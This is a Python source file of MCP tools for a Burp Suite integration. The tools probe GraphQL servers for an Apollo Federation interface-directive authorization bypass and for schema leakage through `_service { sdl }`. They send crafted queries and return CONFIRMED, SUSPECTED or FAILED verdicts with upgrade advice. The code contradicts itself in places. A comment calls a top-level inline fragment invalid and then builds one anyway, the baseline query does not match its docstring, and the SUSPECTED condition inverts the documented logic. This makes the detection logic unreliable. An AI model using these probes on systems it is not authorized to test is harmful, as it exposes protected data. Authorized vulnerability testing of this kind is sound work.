"""Apollo Federation probes:
  - probe_apollo_interface_authz_bypass: interface-directive authz NOT inherited
    by implementing types (Apollo Federation < 2.9.5 / 2.10.4 / 2.11.5 / 2.12.1).
  - probe_apollo_sdl_leak: `query { _service { sdl } }` returns full SDL even
    when generic introspection is disabled.

Both return VerdictResult.
"""

from __future__ import annotations

import json

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import make_verdict, error_verdict


_SDL_QUERY = "query PraetorSdlProbe { _service { sdl } }"


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_apollo_interface_authz_bypass(
        graphql_url: str,
        interface_type: str,
        implementation_type: str,
        protected_field: str,
        session: str = "",
        bearer_token: str = "",
    ) -> dict:
        """Probe Apollo Federation interface-directive authz bypass.

        Compares two queries:
          A) `{ __typename }` on the interface type — baseline reachability.
          B) `{ ... on <Impl> { <protectedField> } }` inline-fragment access
             via the interface — bypasses authz directives applied at the
             interface level but missing on the implementation.

        CONFIRMED if query B returns data for a field that should be guarded.
        SUSPECTED if errors carry "Cannot query field" but interface query
        returned data — partial enforcement.

        Args:
            graphql_url: GraphQL endpoint URL.
            interface_type: GraphQL interface type name (e.g. "Node").
            implementation_type: implementing type name (e.g. "AdminUser").
            protected_field: field name expected to be authz-restricted.
            session: optional session name.
            bearer_token: optional Bearer token.

        Returns: VerdictResult.
        """
        if not graphql_url or not interface_type or not implementation_type or not protected_field:
            return error_verdict(
                "graphql_url, interface_type, implementation_type, protected_field all required",
                vuln_type="apollo_interface_authz_bypass",
            )

        logger_indices: list[int] = []

        baseline_query = f"query A {{ __schema {{ types {{ name }} }} }}"
        bypass_query = (
            f"query B {{ "
            f"node: __typename "
            f"... on {implementation_type} {{ {protected_field} }} }}"
        )
        # Note: top-level inline fragment isn't valid; use a more realistic
        # introspection-via-interface pattern:
        bypass_query = (
            f"query Bypass {{ "
            f"_dummy: __typename "
            f"... on {interface_type} {{ "
            f"  ... on {implementation_type} {{ {protected_field} }} "
            f"}} }}"
        )

        baseline = await _send_graphql(graphql_url, baseline_query, session, bearer_token)
        b_logger = baseline.get("logger_index", -1)
        if isinstance(b_logger, int) and b_logger >= 0:
            logger_indices.append(b_logger)

        bypass = await _send_graphql(graphql_url, bypass_query, session, bearer_token)
        v_logger = bypass.get("logger_index", -1)
        if isinstance(v_logger, int) and v_logger >= 0:
            logger_indices.append(v_logger)

        reproductions = [
            {"variant": "baseline_introspection", "status_code": baseline.get("status_code"),
             "logger_index": b_logger},
            {"variant": "interface_implementation_bypass",
             "status_code": bypass.get("status_code"), "logger_index": v_logger,
             "query": bypass_query},
        ]

        bypass_body = bypass.get("response_body", "") or ""
        bypass_obj = _parse_json(bypass_body)

        # CONFIRMED: bypass returned data for the protected field
        if bypass_obj and "data" in bypass_obj and bypass_obj["data"]:
            data = bypass_obj["data"]
            if isinstance(data, dict) and protected_field in str(data):
                return make_verdict(
                    "CONFIRMED", 0.88,
                    f"Apollo Federation interface-directive bypass — protected "
                    f"field `{protected_field}` accessible via "
                    f"`{interface_type}` interface fragment on `{implementation_type}`",
                    vuln_type="apollo_interface_authz_bypass",
                    logger_indices=logger_indices,
                    reproductions=reproductions,
                    details={"data_excerpt": str(data)[:400],
                             "fix": "Upgrade Apollo Federation to "
                                    ">=2.9.5/2.10.4/2.11.5/2.12.1"},
                    summary=f"CONFIRMED Apollo interface authz bypass on `{protected_field}`",
                )

        # SUSPECTED: partial-enforcement signal
        if bypass_obj and "errors" in bypass_obj:
            errs = bypass_obj["errors"]
            err_text = json.dumps(errs) if isinstance(errs, list) else str(errs)
            if "Cannot query field" not in err_text and "not authorized" not in err_text.lower():
                return make_verdict(
                    "SUSPECTED", 0.50,
                    f"Bypass query returned errors not matching standard authz/syntax "
                    f"messages — partial enforcement possible. Manual review.",
                    vuln_type="apollo_interface_authz_bypass",
                    logger_indices=logger_indices,
                    reproductions=reproductions,
                    details={"errors_excerpt": err_text[:400]},
                    summary=f"SUSPECTED Apollo interface enforcement gap",
                )

        return make_verdict(
            "FAILED", 0.10,
            "Interface-fragment bypass query did not return protected data",
            vuln_type="apollo_interface_authz_bypass",
            logger_indices=logger_indices,
            reproductions=reproductions,
            summary="FAILED — no Apollo interface authz bypass",
        )

    @mcp.tool()
    async def probe_apollo_sdl_leak(
        graphql_url: str,
        session: str = "",
        bearer_token: str = "",
    ) -> dict:
        """Probe Apollo Federation `_service.sdl` schema leak.

        Federation servers expose `_service { sdl }` as a federated-router
        helper. When standard introspection is disabled, operators often
        forget to disable this helper — full SDL returned anyway.

        CONFIRMED on SDL string containing `type Query` or `extend type`.
        FAILED otherwise.

        Returns: VerdictResult.
        """
        if not graphql_url:
            return error_verdict("graphql_url required",
                                 vuln_type="apollo_sdl_leak")

        resp = await _send_graphql(graphql_url, _SDL_QUERY, session, bearer_token)
        logger_idx = resp.get("logger_index", -1)
        logger_indices = [logger_idx] if isinstance(logger_idx, int) and logger_idx >= 0 else []

        body = resp.get("response_body", "") or ""
        obj = _parse_json(body)
        reproductions = [{
            "variant": "sdl_query",
            "status_code": resp.get("status_code"),
            "logger_index": logger_idx,
        }]

        if obj and isinstance(obj.get("data"), dict):
            svc = obj["data"].get("_service")
            sdl = (svc or {}).get("sdl") if isinstance(svc, dict) else None
            if isinstance(sdl, str) and (
                "type Query" in sdl or "extend type" in sdl or "schema" in sdl
            ):
                return make_verdict(
                    "CONFIRMED", 0.90,
                    f"Apollo Federation `_service.sdl` returned full schema "
                    f"({len(sdl)} chars). Introspection helper not gated.",
                    vuln_type="apollo_sdl_leak",
                    logger_indices=logger_indices,
                    reproductions=reproductions,
                    details={"sdl_length": len(sdl), "sdl_excerpt": sdl[:600]},
                    summary=f"CONFIRMED Apollo SDL leak via _service.sdl on {graphql_url}",
                )

        return make_verdict(
            "FAILED", 0.10,
            "`_service.sdl` query did not return SDL",
            vuln_type="apollo_sdl_leak",
            logger_indices=logger_indices,
            reproductions=reproductions,
            summary=f"FAILED — no Apollo SDL leak on {graphql_url}",
        )


async def _send_graphql(url: str, query: str, session: str, bearer: str) -> dict:
    headers = [{"name": "Content-Type", "value": "application/json"}]
    if bearer:
        headers.append({"name": "Authorization", "value": f"Bearer {bearer}"})
    body = {"query": query}
    if session:
        return await client.post("/api/session/request", json={
            "session": session, "method": "POST", "url": url,
            "headers": headers, "json_body": body,
        })
    return await client.post("/api/http/curl", json={
        "method": "POST", "url": url,
        "headers": headers, "json_body": body,
    })


def _parse_json(body: str) -> dict | None:
    if not body:
        return None
    try:
        obj = json.loads(body)
        return obj if isinstance(obj, dict) else None
    except json.JSONDecodeError:
        return None
